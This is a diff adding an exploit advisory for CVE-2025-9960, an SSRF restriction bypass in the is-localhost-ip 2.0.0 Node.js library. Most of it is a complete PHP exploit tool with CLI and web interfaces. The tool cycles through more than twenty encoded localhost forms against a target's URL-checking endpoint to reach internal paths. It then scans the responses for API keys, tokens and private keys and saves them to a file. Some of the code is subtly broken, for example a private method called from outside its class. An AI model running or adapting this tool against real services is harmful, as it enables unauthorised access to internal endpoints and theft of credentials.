@@ -1,0 +1,552 @@
+=============================================================================================================================================
+| # Title     : is-localhost-ip 2.0.0 Restriction Bypass                                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/tinovyatkin/is-localhost-ip                                                                              |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211369/ &	CVE-2025-9960
+
+[+] Summary : is-localhost-ip (v2.0.0) is a compact, dependency‑free JavaScript library (~100 LOC) designed to determine whether a given hostname or IPv4/IPv6 address refers to the local machine
+              The vulnerability does not affect the browser or the operating system.
+              It affects the application layer, specifically Node.js applications that rely on the is-localhost-ip library for SSRF protection.
+
+Any Node.js (commonly Express.js) service that imports and uses:
+
+const isLocalhost = require("is-localhost-ip");
+
+to block loopback access can be bypassed due to incomplete IPv6‑mapped address handling.
+
+So the impacted target is:
+
+Node.js application (e.g., Express server) using is-localhost-ip v2.0.0
+
+Not:
+
+❌ Browser
+❌ Operating system
+
+But:
+
+✔ Node.js application using the library
+
+[+]  POC :   * Usage: php exploit.php --target=http://victim.com:3005
+
+<?php
+/**
+ * SSRF Exploit for is-localhost-ip 2.0.0
+ * Author: indoushka
+ */
+
+class SSRFExploit {
+    private $target;
+    private $internalEndpoint;
+    private $timeout = 10;
+    
+    // جميع متغيرات localhost المحتملة
+    private $localhostVariants = [
+        // IPv4 standard
+        '127.0.0.1',
+        '127.0.0.01',
+        '127.000.000.001',
+        
+        // Hexadecimal
+        '0x7f000001',
+        
+        // Decimal
+        '2130706433',
+        
+        // Octal
+        '0177.0.0.01',
+        '0177.000.000.001',
+        
+        // IPv6
+        '[::1]',
+        '[::ffff:127.0.0.1]',
+        '[::ffff:7f00:1]',
+        '[0:0:0:0:0:ffff:7f00:1]',
+        
+        // Shortened forms
+        '127.1',
+        '127.0.1',
+        
+        // DNS
+        'localhost',
+        'local',
+        'loopback',
+        'ip6-localhost',
+        
+        // Word variations
+        'localtest.me',
+        'localtest',
+        '127.0.0.1.nip.io',
+        '127-0-0-1.nip.io',
+    ];
+    
+    public function __construct($target, $internalEndpoint = '/secret') {
+        $this->target = rtrim($target, '/');
+        $this->internalEndpoint = $internalEndpoint;
+    }
+    
+    /**
+     * اختبار جميع المتغيرات
+     */
+    public function testAllVariants() {
+        echo " Starting SSRF Exploit against: {$this->target}\n";
+        echo " Testing localhost bypass variants...\n";
+        echo str_repeat("=", 80) . "\n";
+        
+        $results = [];
+        $successCount = 0;
+        
+        foreach ($this->localhostVariants as $variant) {
+            $result = $this->testVariant($variant);
+            $results[] = $result;
+            
+            if ($result['success']) {
+                $successCount++;
+                echo " SUCCESS: {$variant}\n";
+                echo "   Response: " . substr($result['response'], 0, 200) . "...\n";
+                echo "   Full URL: {$result['url']}\n";
+                echo str_repeat("-", 80) . "\n";
+            } else {
+                echo " FAILED: {$variant}\n";
+                echo "   Reason: {$result['error']}\n";
+                echo str_repeat("-", 80) . "\n";
+            }
+            
+            // تأخير قصير لتجنب الحظر
+            usleep(500000); // 0.5 ثانية
+        }
+        
+        // عرض النتائج
+        $this->showResults($results, $successCount);
+        
+        // حفظ النتائج في ملف
+        $this->saveResults($results);
+        
+        return $results;
+    }
+    
+    /**
+     * اختبار متغير معين
+     */
+    private function testVariant($variant) {
+        $port = 3005; // المنفذ الافتراضي
+        $testUrl = "http://{$variant}:{$port}{$this->internalEndpoint}";
+        $encodedUrl = urlencode($testUrl);
+        $attackUrl = "{$this->target}/check-url?url={$encodedUrl}";
+        
+        try {
+            $ch = curl_init();
+            
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $attackUrl,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => $this->timeout,
+                CURLOPT_FOLLOWLOCATION => false,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_USERAGENT => 'Mozilla/5.0 (SSRF-Test)',
+                CURLOPT_HTTPHEADER => [
+                    'Accept: application/json,text/html',
+                    'X-Forwarded-For: 127.0.0.1',
+                ],
+            ]);
+            
+            $response = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $error = curl_error($ch);
+            curl_close($ch);
+            
+            if ($error) {
+                return [
+                    'variant' => $variant,
+                    'success' => false,
+                    'error' => "CURL Error: {$error}",
+                    'url' => $attackUrl,
+                    'http_code' => 0,
+                    'response' => ''
+                ];
+            }
+            
+            if ($httpCode === 403) {
+                return [
+                    'variant' => $variant,
+                    'success' => false,
+                    'error' => "Blocked (403 Forbidden)",
+                    'url' => $attackUrl,
+                    'http_code' => $httpCode,
+                    'response' => $response
+                ];
+            }
+            
+            if ($httpCode === 200) {
+                // تحقق إذا كان الرد يحتوي على بيانات حساسة
+                $isSensitive = $this->checkSensitiveData($response);
+                
+                return [
+                    'variant' => $variant,
+                    'success' => $isSensitive,
+                    'error' => $isSensitive ? "" : "200 OK but no sensitive data",
+                    'url' => $attackUrl,
+                    'http_code' => $httpCode,
+                    'response' => $response,
+                    'sensitive' => $isSensitive
+                ];
+            }
+            
+            return [
+                'variant' => $variant,
+                'success' => false,
+                'error' => "HTTP {$httpCode}",
+                'url' => $attackUrl,
+                'http_code' => $httpCode,
+                'response' => $response
+            ];
+            
+        } catch (Exception $e) {
+            return [
+                'variant' => $variant,
+                'success' => false,
+                'error' => "Exception: " . $e->getMessage(),
+                'url' => $attackUrl,
+                'http_code' => 0,
+                'response' => ''
+            ];
+        }
+    }
+    
+    /**
+     * التحقق من وجود بيانات حساسة في الرد
+     */
+    private function checkSensitiveData($response) {
+        $sensitivePatterns = [
+            '/apikey/i',
+            '/secret/i',
+            '/token/i',
+            '/password/i',
+            '/key/i',
+            '/private/i',
+            '/aws/i',
+            '/azure/i',
+            '/gcp/i',
+            '/metadata/i',
+            '/admin/i',
+            '/credential/i',
+            '/jwt/i',
+            '/bearer/i',
+            '/ssh/i',
+            '/rsa/i',
+            '/BEGIN.*PRIVATE.*KEY/i',
+        ];
+        
+        foreach ($sensitivePatterns as $pattern) {
+            if (preg_match($pattern, $response)) {
+                return true;
+            }
+        }
+        
+        // تحقق من JSON يحتوي على مفاتيح حساسة
+        if ($this->isJson($response)) {
+            $data = json_decode($response, true);
+            if (is_array($data)) {
+                $sensitiveKeys = ['apikey', 'secret', 'token', 'password', 'key'];
+                foreach ($sensitiveKeys as $key) {
+                    if (isset($data[$key])) {
+                        return true;
+                    }
+                }
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * التحقق إذا كان النص JSON
+     */
+    private function isJson($string) {
+        json_decode($string);
+        return json_last_error() === JSON_ERROR_NONE;
+    }
+    
+    /**
+     * عرض النتائج النهائية
+     */
+    private function showResults($results, $successCount) {
+        echo "\n" . str_repeat("=", 80) . "\n";
+        echo " EXPLOIT RESULTS SUMMARY\n";
+        echo str_repeat("=", 80) . "\n";
+        echo "Target: {$this->target}\n";
+        echo "Total Variants Tested: " . count($results) . "\n";
+        echo "Successful Bypasses: {$successCount}\n";
+        echo "Blocked/Failed: " . (count($results) - $successCount) . "\n";
+        echo str_repeat("-", 80) . "\n";
+        
+        if ($successCount > 0) {
+            echo " VULNERABILITY CONFIRMED!\n";
+            echo " SSRF Bypass Successful\n\n";
+            
+            echo "Successful Variants:\n";
+            foreach ($results as $result) {
+                if ($result['success']) {
+                    echo "  • {$result['variant']}\n";
+                    echo "    URL: {$result['url']}\n";
+                    echo "    Response Preview: " . substr($result['response'], 0, 100) . "...\n\n";
+                }
+            }
+        } else {
+            echo " Target appears to be protected\n";
+            echo " No successful bypasses found\n";
+        }
+    }
+    
+    /**
+     * حفظ النتائج في ملف
+     */
+    private function saveResults($results) {
+        $filename = 'ssrf_results_' . date('Y-m-d_H-i-s') . '.txt';
+        $content = "SSRF Exploit Results\n";
+        $content .= "Target: {$this->target}\n";
+        $content .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
+        
+        foreach ($results as $result) {
+            $content .= str_repeat("-", 60) . "\n";
+            $content .= "Variant: {$result['variant']}\n";
+            $content .= "Success: " . ($result['success'] ? 'YES' : 'NO') . "\n";
+            $content .= "HTTP Code: {$result['http_code']}\n";
+            $content .= "Error: {$result['error']}\n";
+            $content .= "URL: {$result['url']}\n";
+            $content .= "Response:\n{$result['response']}\n\n";
+        }
+        
+        file_put_contents($filename, $content);
+        echo "📄 Results saved to: {$filename}\n";
+    }
+    
+    /**
+     * هجوم متقدم باستخدام IP المدخل من المستخدم
+     */
+    public function customAttack($customIp, $port = 3005, $endpoint = '/secret') {
+        echo " Custom Attack with IP: {$customIp}\n";
+        
+        $variants = [
+            $customIp,
+            $this->decimalToIp($customIp),
+            $this->ipToHex($customIp),
+            $this->ipToOctal($customIp),
+            "[::ffff:" . $this->ipv4ToHex($customIp) . "]",
+        ];
+        
+        foreach ($variants as $variant) {
+            echo "\nTesting variant: {$variant}\n";
+            $result = $this->testVariant($variant);
+            
+            if ($result['success']) {
+                echo " SUCCESS!\n";
+                echo "Response: " . substr($result['response'], 0, 200) . "\n";
+                return $result;
+            }
+        }
+        
+        echo " All variants failed\n";
+        return false;
+    }
+    
+    /**
+     * تحويل IP إلى تمثيل عشري
+     */
+    private function ipToDecimal($ip) {
+        $parts = explode('.', $ip);
+        if (count($parts) !== 4) return $ip;
+        
+        return ($parts[0] * 16777216) + 
+               ($parts[1] * 65536) + 
+               ($parts[2] * 256) + 
+               $parts[3];
+    }
+    
+    /**
+     * تحويل IP إلى سداسي عشري
+     */
+    private function ipToHex($ip) {
+        $decimal = $this->ipToDecimal($ip);
+        return '0x' . dechex($decimal);
+    }
+    
+    /**
+     * تحويل IP إلى ثماني
+     */
+    private function ipToOctal($ip) {
+        $parts = explode('.', $ip);
+        if (count($parts) !== 4) return $ip;
+        
+        $octalParts = array_map(function($part) {
+            return '0' . decoct($part);
+        }, $parts);
+        
+        return implode('.', $octalParts);
+    }
+    
+    /**
+     * تحويل عشري إلى IP
+     */
+    private function decimalToIp($decimal) {
+        return long2ip($decimal);
+    }
+    
+    /**
+     * تحويل IPv4 إلى سداسي عشري لـ IPv6
+     */
+    private function ipv4ToHex($ip) {
+        $parts = explode('.', $ip);
+        if (count($parts) !== 4) return $ip;
+        
+        $hexParts = array_map(function($part) {
+            return str_pad(dechex($part), 2, '0', STR_PAD_LEFT);
+        }, $parts);
+        
+        return implode('', $hexParts);
+    }
+}
+
+/**
+ * دالة CLI للمساعدة
+ */
+function showHelp() {
+    echo "SSRF Exploit Tool for is-localhost-ip 2.0.0\n";
+    echo "Usage:\n";
+    echo "  php exploit.php --target=http://victim.com:3005\n";
+    echo "  php exploit.php --target=http://victim.com:3005 --custom=127.0.0.1\n";
+    echo "  php exploit.php --target=http://victim.com:3005 --endpoint=/admin\n";
+    echo "  php exploit.php --help\n\n";
+    echo "Options:\n";
+    echo "  --target     Target URL (required)\n";
+    echo "  --custom     Custom IP to test\n";
+    echo "  --endpoint   Internal endpoint to access (default: /secret)\n";
+    echo "  --port       Port number (default: 3005)\n";
+    echo "  --help       Show this help\n";
+}
+
+/**
+ * المعالجة من سطر الأوامر
+ */
+if (PHP_SAPI === 'cli') {
+    $options = getopt('', ['target:', 'custom:', 'endpoint:', 'port:', 'help']);
+    
+    if (isset($options['help']) || !isset($options['target'])) {
+        showHelp();
+        exit();
+    }
+    
+    $target = $options['target'];
+    $endpoint = $options['endpoint'] ?? '/secret';
+    $port = $options['port'] ?? 3005;
+    
+    $exploit = new SSRFExploit($target, $endpoint);
+    
+    if (isset($options['custom'])) {
+        // هجوم مخصص
+        $customIp = $options['custom'];
+        $exploit->customAttack($customIp, $port, $endpoint);
+    } else {
+        // اختبار جميع المتغيرات
+        $exploit->testAllVariants();
+    }
+} else {
+    // واجهة ويب بسيطة
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>SSRF Exploit Tester</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 40px; }
+            .container { max-width: 800px; margin: auto; }
+            .form-group { margin-bottom: 15px; }
+            label { display: block; margin-bottom: 5px; font-weight: bold; }
+            input[type="text"] { width: 100%; padding: 8px; border: 1px solid #ddd; }
+            button { background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer; }
+            .result { margin-top: 20px; padding: 15px; background: #f8f9fa; border-left: 4px solid #007bff; }
+            .success { border-color: #28a745; background: #d4edda; }
+            .error { border-color: #dc3545; background: #f8d7da; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1> SSRF Exploit Tester</h1>
+            <p>Test for CVE-2025-9960 (is-localhost-ip bypass)</p>
+            
+            <form method="POST">
+                <div class="form-group">
+                    <label for="target">Target URL:</label>
+                    <input type="text" id="target" name="target" 
+                           placeholder="http://victim.com:3005" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="endpoint">Internal Endpoint:</label>
+                    <input type="text" id="endpoint" name="endpoint" 
+                           value="/secret" placeholder="/admin, /internal, etc.">
+                </div>
+                
+                <div class="form-group">
+                    <label for="custom">Custom IP (optional):</label>
+                    <input type="text" id="custom" name="custom" 
+                           placeholder="127.0.0.1, 192.168.1.1, etc.">
+                </div>
+                
+                <button type="submit" name="test">Test SSRF</button>
+                <button type="submit" name="quick">Quick Test</button>
+            </form>
+            
+            <?php
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                $target = $_POST['target'] ?? '';
+                $endpoint = $_POST['endpoint'] ?? '/secret';
+                $customIp = $_POST['custom'] ?? '';
+                
+                if (!empty($target)) {
+                    $exploit = new SSRFExploit($target, $endpoint);
+                    
+                    echo '<div class="result">';
+                    echo '<h3>Test Results:</h3>';
+                    
+                    if (isset($_POST['quick'])) {
+                        // اختبار سريع
+                        echo '<p>Performing quick test...</p>';
+                        $quickVariants = ['127.0.0.1', '0x7f000001', '2130706433', '[::ffff:7f00:1]'];
+                        
+                        foreach ($quickVariants as $variant) {
+                            $result = $exploit->testVariant($variant);
+                            echo $result['success'] 
+                                ? "<p class='success'> {$variant}: SUCCESS</p>"
+                                : "<p class='error'> {$variant}: FAILED</p>";
+                        }
+                    } else {
+                        // اختبار كامل
+                        $results = $exploit->testAllVariants();
+                    }
+                    
+                    echo '</div>';
+                }
+            }
+            ?>
+            
+            <div class="result">
+                <h4> About This Exploit:</h4>
+                <p>This tool demonstrates SSRF bypass in is-localhost-ip v2.0.0</p>
+                <p><strong>CVE:</strong> CVE-2025-9960</p>
+                <p><strong>Vulnerability:</strong> Server-Side Request Forgery via localhost restriction bypass</p>
+                <p><strong>Test Variants:</strong> 20+ localhost representations</p>
+                <p><strong>Use Responsibly:</strong> Only test on systems you own or have permission to test</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+}
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
